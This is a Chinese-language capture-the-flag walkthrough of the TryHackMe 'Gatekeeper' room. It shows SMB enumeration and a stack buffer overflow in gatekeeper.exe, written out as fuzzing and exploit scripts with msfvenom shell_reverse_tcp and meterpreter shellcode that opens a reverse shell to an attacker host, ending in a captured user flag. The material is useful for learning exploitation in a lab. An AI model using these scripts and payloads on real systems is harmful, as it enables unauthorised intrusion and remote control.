# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
┌──(root💀kali)-[~/tryhackme/Gatekeeper]
└─# nmap -sV -Pn 10.10.157.221 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-23 00:58 EST
Nmap scan report for 10.10.157.221
Host is up (0.33s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
31337/tcp open  Elite?
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49175/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=7%D=11/23%Time=619C8321%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%
SF:r(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x2
SF:0Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@
SF:nm>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID
SF::\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-For
SF:wards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact
SF::\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\
SF:x20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HT
SF:TPOptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n
SF:")%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20
SF:\r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20
SF:\x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSes
SF:sionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fo
SF:urOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eb
SF:ak\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01d
SF:efault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n
SF:");
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 205.24 seconds

```

用```enum4linux```无发现

用```smbmap```探测```anonymous```能过访问的分享文件夹
```
┌──(root💀kali)-[~/tryhackme/Gatekeeper]
└─# smbmap -H 10.10.157.221 -u anonymous
[+] Guest session       IP: 10.10.157.221:445    Name: 10.10.157.221                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Users                                                   READ ONLY

```

能够访问```Users```文件夹

```
┌──(root💀kali)-[~/tryhackme/Gatekeeper]
└─# smbclient //10.10.157.221/Users     
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020

                7863807 blocks of size 4096. 3877398 blocks available

```

把里面所有能过下载的文件都下载下来分析，尤其注意Share下的这个```gatekeeper.exe```文件
```
smb: \share\> ls
  .                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020

```

我们在windows上开启这个``` gatekeeper.exe ```程序，发现他开启了31337端口,从nmap扫描结果得知，靶机也开启了31337端口，也就是说靶机里面也有这个程序在运行。

# 缓冲区溢出攻击

Fuzzing!
```
#!/usr/bin/python
import sys, socket

ip = '192.168.3.49'
port = 31337
buffer = ['A']
counter = 100

while len(buffer) <= 10:
    buffer.append('A'*counter)
    counter = counter + 100

try:
    for string in buffer:
        print '[+] Sending %s bytes...' % len(string)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send("User" '\r\n')
        s.recv(1024)
        s.send(string + '\r\n')
        print '[+] Done'
except:
    print '[!] A connection can\'t be stablished to the program. It may have crashed.'
    sys.exit(0)
finally:
    s.close()

```

在发送300个字节时，靶机程序奔溃。
![alt 属性文本](https://github.com/maxzxc0110/hack-study/blob/main/img/fuzz.png "fuzz")

## 计算EIP位置
此时我们生成一段不重复字节，长度比Fuzzing出来令到靶机程序崩溃的字节数略长一点，我们在这里选择400个字节，执行


> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400


```
┌──(root💀kali)-[~/tryhackme/Gatekeeper/bof]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

使用下面脚本进行攻击：
```
#coding=utf-8
#!/usr/bin/python

#这里主要是为了定位EIP的内存地址
import socket

ip = "192.168.3.49"
port = 31337

prefix = "OVERFLOW1 "
offset = 0 
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```


EIP地址：65413565


计算出EIP的偏移量

> msf-pattern_offset -q 65413565

```
┌──(root💀kali)-[~/tryhackme/Gatekeeper/bof]
└─# msf-pattern_offset -q 65413565
[*] Exact match at offset 136

```

得出偏移量值为：136

## 查找坏字节

我们在Immunity Debugger中输入：```!mona bytearray -b "\x00"```

0x00在C/C++语言中表示终止，所以是一个很普遍的坏字节，在上面我们首先把它排除掉。
我们用下面的bytearray.py脚本生成所有字节码：

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

执行：
```
┌──(root💀kali)-[~/tryhackme/Gatekeeper/bof]
└─# python3 bytearray.py 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

```


此时我们准备第二个攻击脚本exploit2.py，把上面生成的字节码粘贴到payload变量

同时，我们把偏移量136赋值到offset变量，把"BBBB"赋值到retn变量，重启程序，执行下面的脚本

```
import socket

ip = "192.168.3.49"
port = 31337

prefix = "OVERFLOW1 "
offset = 136
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```

我们可以查看到EIP的值，此时已经变成了42424242，42在ASCII里就是大写的B，也就是我们上面的exploit.py里面retn的值，此时已证明可以覆盖到EIP。


另外，记住这里ESP的值是：003719F8

我们执行```!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 003719F8```


得到一个可能的坏字节的序列:
```POSSIBLY BAD CHARS:01 0a```


!mona bytearray -b "\x00\x01\x0a"


!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 004819F8

004819F8


!mona jmp -r esp -cpb "\x00\x01\x0a"

有两个地址，我们选择第一个：080414c3

需要注意的是这个地址需要从后面往回写，即：\xc3\x14\x04\x08

利用msfvenom ，我们生成攻击的shellcode
> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.67 LPORT=4444 EXITFUNC=thread -b "\x00\x01\x0a" -f c

```
┌──(root💀kali)-[~/tryhackme/Gatekeeper]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.67 LPORT=4444 EXITFUNC=thread -b "\x00\x01\x0a" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xbf\x9b\xb8\x8f\xc4\xda\xcf\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x83\xc0\x04\x31\x78\x0e\x03\xe3\xb6\x6d\x31\xef\x2f\xf3"
"\xba\x0f\xb0\x94\x33\xea\x81\x94\x20\x7f\xb1\x24\x22\x2d\x3e"
"\xce\x66\xc5\xb5\xa2\xae\xea\x7e\x08\x89\xc5\x7f\x21\xe9\x44"
"\xfc\x38\x3e\xa6\x3d\xf3\x33\xa7\x7a\xee\xbe\xf5\xd3\x64\x6c"
"\xe9\x50\x30\xad\x82\x2b\xd4\xb5\x77\xfb\xd7\x94\x26\x77\x8e"
"\x36\xc9\x54\xba\x7e\xd1\xb9\x87\xc9\x6a\x09\x73\xc8\xba\x43"
"\x7c\x67\x83\x6b\x8f\x79\xc4\x4c\x70\x0c\x3c\xaf\x0d\x17\xfb"
"\xcd\xc9\x92\x1f\x75\x99\x05\xfb\x87\x4e\xd3\x88\x84\x3b\x97"
"\xd6\x88\xba\x74\x6d\xb4\x37\x7b\xa1\x3c\x03\x58\x65\x64\xd7"
"\xc1\x3c\xc0\xb6\xfe\x5e\xab\x67\x5b\x15\x46\x73\xd6\x74\x0f"
"\xb0\xdb\x86\xcf\xde\x6c\xf5\xfd\x41\xc7\x91\x4d\x09\xc1\x66"
"\xb1\x20\xb5\xf8\x4c\xcb\xc6\xd1\x8a\x9f\x96\x49\x3a\xa0\x7c"
"\x89\xc3\x75\xd2\xd9\x6b\x26\x93\x89\xcb\x96\x7b\xc3\xc3\xc9"
"\x9c\xec\x09\x62\x36\x17\xda\x4d\x6f\x14\x59\x26\x72\x1a\x4c"
"\xea\xfb\xfc\x04\x02\xaa\x57\xb1\xbb\xf7\x23\x20\x43\x22\x4e"
"\x62\xcf\xc1\xaf\x2d\x38\xaf\xa3\xda\xc8\xfa\x99\x4d\xd6\xd0"
"\xb5\x12\x45\xbf\x45\x5c\x76\x68\x12\x09\x48\x61\xf6\xa7\xf3"
"\xdb\xe4\x35\x65\x23\xac\xe1\x56\xaa\x2d\x67\xe2\x88\x3d\xb1"
"\xeb\x94\x69\x6d\xba\x42\xc7\xcb\x14\x25\xb1\x85\xcb\xef\x55"
"\x53\x20\x30\x23\x5c\x6d\xc6\xcb\xed\xd8\x9f\xf4\xc2\x8c\x17"
"\x8d\x3e\x2d\xd7\x44\xfb\x4d\x3a\x4c\xf6\xe5\xe3\x05\xbb\x6b"
"\x14\xf0\xf8\x95\x97\xf0\x80\x61\x87\x71\x84\x2e\x0f\x6a\xf4"
"\x3f\xfa\x8c\xab\x40\x2f";

```


把生成的shellcode放到我们最后一个攻击脚本exploit3.py中
```
import socket

ip = "192.168.3.49"
port = 31337

prefix = "OVERFLOW1 "
offset = 136 
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"

padding = "\x90" * 16

buf = ""
buf +="\xbf\x9b\xb8\x8f\xc4\xda\xcf\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
buf +="\x52\x83\xc0\x04\x31\x78\x0e\x03\xe3\xb6\x6d\x31\xef\x2f\xf3"
buf +="\xba\x0f\xb0\x94\x33\xea\x81\x94\x20\x7f\xb1\x24\x22\x2d\x3e"
buf +="\xce\x66\xc5\xb5\xa2\xae\xea\x7e\x08\x89\xc5\x7f\x21\xe9\x44"
buf +="\xfc\x38\x3e\xa6\x3d\xf3\x33\xa7\x7a\xee\xbe\xf5\xd3\x64\x6c"
buf +="\xe9\x50\x30\xad\x82\x2b\xd4\xb5\x77\xfb\xd7\x94\x26\x77\x8e"
buf +="\x36\xc9\x54\xba\x7e\xd1\xb9\x87\xc9\x6a\x09\x73\xc8\xba\x43"
buf +="\x7c\x67\x83\x6b\x8f\x79\xc4\x4c\x70\x0c\x3c\xaf\x0d\x17\xfb"
buf +="\xcd\xc9\x92\x1f\x75\x99\x05\xfb\x87\x4e\xd3\x88\x84\x3b\x97"
buf +="\xd6\x88\xba\x74\x6d\xb4\x37\x7b\xa1\x3c\x03\x58\x65\x64\xd7"
buf +="\xc1\x3c\xc0\xb6\xfe\x5e\xab\x67\x5b\x15\x46\x73\xd6\x74\x0f"
buf +="\xb0\xdb\x86\xcf\xde\x6c\xf5\xfd\x41\xc7\x91\x4d\x09\xc1\x66"
buf +="\xb1\x20\xb5\xf8\x4c\xcb\xc6\xd1\x8a\x9f\x96\x49\x3a\xa0\x7c"
buf +="\x89\xc3\x75\xd2\xd9\x6b\x26\x93\x89\xcb\x96\x7b\xc3\xc3\xc9"
buf +="\x9c\xec\x09\x62\x36\x17\xda\x4d\x6f\x14\x59\x26\x72\x1a\x4c"
buf +="\xea\xfb\xfc\x04\x02\xaa\x57\xb1\xbb\xf7\x23\x20\x43\x22\x4e"
buf +="\x62\xcf\xc1\xaf\x2d\x38\xaf\xa3\xda\xc8\xfa\x99\x4d\xd6\xd0"
buf +="\xb5\x12\x45\xbf\x45\x5c\x76\x68\x12\x09\x48\x61\xf6\xa7\xf3"
buf +="\xdb\xe4\x35\x65\x23\xac\xe1\x56\xaa\x2d\x67\xe2\x88\x3d\xb1"
buf +="\xeb\x94\x69\x6d\xba\x42\xc7\xcb\x14\x25\xb1\x85\xcb\xef\x55"
buf +="\x53\x20\x30\x23\x5c\x6d\xc6\xcb\xed\xd8\x9f\xf4\xc2\x8c\x17"
buf +="\x8d\x3e\x2d\xd7\x44\xfb\x4d\x3a\x4c\xf6\xe5\xe3\x05\xbb\x6b"
buf +="\x14\xf0\xf8\x95\x97\xf0\x80\x61\x87\x71\x84\x2e\x0f\x6a\xf4"
buf +="\x3f\xfa\x8c\xab\x40\x2f";

payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

我们先在kali另外开一个新窗口，开启监听：```nc -lvp 4444```


重启gatekeeper.exe，执行exploit3.py

拿到我们靶机的反弹shell：
```
──(root💀kali)-[~/tryhackme/Gatekeeper]
└─# nc -lnvp 4444             
listening on [any] 4444 ...
connect to [192.168.3.67] from (UNKNOWN) [192.168.3.49] 49184
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Users\max\Desktop>whoami
whoami
win-mrft0tavd10\max

C:\Users\max\Desktop>

```

# 正式攻击

为了后续渗透提权比较简单，我们的payload换成了meterpreter
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.21.169  LPORT=4444 EXITFUNC=thread -b "\x00\x01\x0a" -f c

```
┌──(root💀kali)-[~/tryhackme/Gatekeeper]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.21.169  LPORT=4444 EXITFUNC=thread -b "\x00\x01\x0a" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 402 (iteration=0)
x86/shikata_ga_nai chosen with final size 402
Payload size: 402 bytes
Final size of c file: 1713 bytes
unsigned char buf[] = 
"\xbb\xa9\xcd\x79\xdd\xdb\xdf\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x5e\x31\x5f\x15\x03\x5f\x15\x83\xc7\x04\xe2\x5c\x31\x91\x52"
"\x9e\xca\x62\x0d\xaf\x18\x06\x46\x9d\xac\x4e\xbd\xaa\x9f\x5c"
"\xb5\xfe\x0b\x52\x7e\xb4\x15\x5d\x7f\xc3\x28\xb5\x4e\x13\x60"
"\xf9\xd1\xef\x7b\x2e\x32\xce\xb3\x23\x33\x17\x02\x49\xdc\xc5"
"\xc2\x3a\x70\xf9\x67\x7e\x49\xf8\xa7\xf4\xf1\x82\xc2\xcb\x86"
"\x3e\xcc\x1b\x36\x35\x86\x83\x3c\x11\x37\xb5\x91\x24\xfe\xc1"
"\x29\x6f\x30\xd5\xd9\x5b\xb9\x28\x08\x92\x7d\xeb\x7b\xd9\xd1"
"\xed\x44\xd9\xc9\x9b\xbe\x1a\x77\x9c\x04\x61\xa3\x29\x9b\xc1"
"\x20\x89\x7f\xf0\xe5\x4c\x0b\xfe\x42\x1a\x53\xe2\x55\xcf\xef"
"\x1e\xdd\xee\x3f\x97\xa5\xd4\x9b\xfc\x7e\x74\xbd\x58\xd0\x89"
"\xdd\x04\x8d\x2f\x95\xa6\xd8\x50\x56\x39\xe5\x0c\xc1\xf6\x28"
"\xaf\x11\x90\x3b\xdc\x23\x3f\x90\x4a\x08\xc8\x3e\x8c\x19\xde"
"\xc0\x42\xa1\x8e\x3e\x63\xd2\x87\x84\x37\x82\xbf\x2d\x38\x49"
"\x3f\xd1\xed\xe4\x35\x45\x04\xf4\x5c\x3c\x70\x04\x5e\x2f\xdd"
"\x81\xb8\x1f\x8d\xc1\x14\xe0\x7d\xa2\xc4\x88\x97\x2d\x3b\xa8"
"\x97\xe7\x54\x43\x78\x5e\x0d\xfc\xe1\xfb\xc5\x9d\xee\xd1\xa0"
"\x9e\x65\xd0\x55\x50\x8e\x91\x45\x85\xe9\x59\x95\x56\x9c\x59"
"\xff\x52\x36\x0d\x97\x58\x6f\x79\x38\xa2\x5a\xf9\x3e\x5c\x1b"
"\xc8\x35\x6b\x89\x74\x21\x94\x5d\x75\xb1\xc2\x37\x75\xd9\xb2"
"\x63\x26\xfc\xbc\xb9\x5a\xad\x28\x42\x0b\x02\xfa\x2a\xb1\x7d"
"\xcc\xf4\x4a\xa8\x4e\xf2\xb5\x2f\x79\x5b\xde\xcf\x39\x5b\x1e"
"\xa5\xb9\x0b\x76\x32\x95\xa4\xb6\xbb\x3c\xed\xde\x36\xd1\x5f"
"\x7e\x47\xf8\x3e\xde\x48\x0f\x9b\xd1\x33\x60\x1c\x12\xc4\x68"
"\x79\x12\xc5\x94\x7f\x2e\x10\xad\xf5\x71\xa1\x8a\x16\x6c\x0f"
"\xe7\xbe\x29\xda\x4a\xa3\xc9\x31\x88\xda\x49\xb3\x71\x19\x51"
"\xb6\x74\x65\xd5\x2b\x05\xf6\xb0\x4b\xba\xf7\x90";


```

把上面生成的payload赋值复制到下面攻击脚本，把ip地址改成远程靶机地址，保存为exploit4.py

```
import socket

ip = "10.10.157.221"
port = 31337

prefix = "OVERFLOW1 "
offset = 136 
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"

padding = "\x90" * 16

buf = ""
buf +="\xbb\xa9\xcd\x79\xdd\xdb\xdf\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
buf +="\x5e\x31\x5f\x15\x03\x5f\x15\x83\xc7\x04\xe2\x5c\x31\x91\x52"
buf +="\x9e\xca\x62\x0d\xaf\x18\x06\x46\x9d\xac\x4e\xbd\xaa\x9f\x5c"
buf +="\xb5\xfe\x0b\x52\x7e\xb4\x15\x5d\x7f\xc3\x28\xb5\x4e\x13\x60"
buf +="\xf9\xd1\xef\x7b\x2e\x32\xce\xb3\x23\x33\x17\x02\x49\xdc\xc5"
buf +="\xc2\x3a\x70\xf9\x67\x7e\x49\xf8\xa7\xf4\xf1\x82\xc2\xcb\x86"
buf +="\x3e\xcc\x1b\x36\x35\x86\x83\x3c\x11\x37\xb5\x91\x24\xfe\xc1"
buf +="\x29\x6f\x30\xd5\xd9\x5b\xb9\x28\x08\x92\x7d\xeb\x7b\xd9\xd1"
buf +="\xed\x44\xd9\xc9\x9b\xbe\x1a\x77\x9c\x04\x61\xa3\x29\x9b\xc1"
buf +="\x20\x89\x7f\xf0\xe5\x4c\x0b\xfe\x42\x1a\x53\xe2\x55\xcf\xef"
buf +="\x1e\xdd\xee\x3f\x97\xa5\xd4\x9b\xfc\x7e\x74\xbd\x58\xd0\x89"
buf +="\xdd\x04\x8d\x2f\x95\xa6\xd8\x50\x56\x39\xe5\x0c\xc1\xf6\x28"
buf +="\xaf\x11\x90\x3b\xdc\x23\x3f\x90\x4a\x08\xc8\x3e\x8c\x19\xde"
buf +="\xc0\x42\xa1\x8e\x3e\x63\xd2\x87\x84\x37\x82\xbf\x2d\x38\x49"
buf +="\x3f\xd1\xed\xe4\x35\x45\x04\xf4\x5c\x3c\x70\x04\x5e\x2f\xdd"
buf +="\x81\xb8\x1f\x8d\xc1\x14\xe0\x7d\xa2\xc4\x88\x97\x2d\x3b\xa8"
buf +="\x97\xe7\x54\x43\x78\x5e\x0d\xfc\xe1\xfb\xc5\x9d\xee\xd1\xa0"
buf +="\x9e\x65\xd0\x55\x50\x8e\x91\x45\x85\xe9\x59\x95\x56\x9c\x59"
buf +="\xff\x52\x36\x0d\x97\x58\x6f\x79\x38\xa2\x5a\xf9\x3e\x5c\x1b"
buf +="\xc8\x35\x6b\x89\x74\x21\x94\x5d\x75\xb1\xc2\x37\x75\xd9\xb2"
buf +="\x63\x26\xfc\xbc\xb9\x5a\xad\x28\x42\x0b\x02\xfa\x2a\xb1\x7d"
buf +="\xcc\xf4\x4a\xa8\x4e\xf2\xb5\x2f\x79\x5b\xde\xcf\x39\x5b\x1e"
buf +="\xa5\xb9\x0b\x76\x32\x95\xa4\xb6\xbb\x3c\xed\xde\x36\xd1\x5f"
buf +="\x7e\x47\xf8\x3e\xde\x48\x0f\x9b\xd1\x33\x60\x1c\x12\xc4\x68"
buf +="\x79\x12\xc5\x94\x7f\x2e\x10\xad\xf5\x71\xa1\x8a\x16\x6c\x0f"
buf +="\xe7\xbe\x29\xda\x4a\xa3\xc9\x31\x88\xda\x49\xb3\x71\x19\x51"
buf +="\xb6\x74\x65\xd5\x2b\x05\xf6\xb0\x4b\xba\xf7\x90";


payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

监听，执行，拿到初始shell和user.txt：
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] Sending stage (175174 bytes) to 10.10.157.221
[*] Meterpreter session 1 opened (10.13.21.169:4444 -> 10.10.157.221:49219) at 2021-11-24 04:18:57 -0500

meterpreter > getuid
Server username: GATEKEEPER\natbat
meterpreter > cat user.txt.txt
{逗你玩儿~}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!
```






 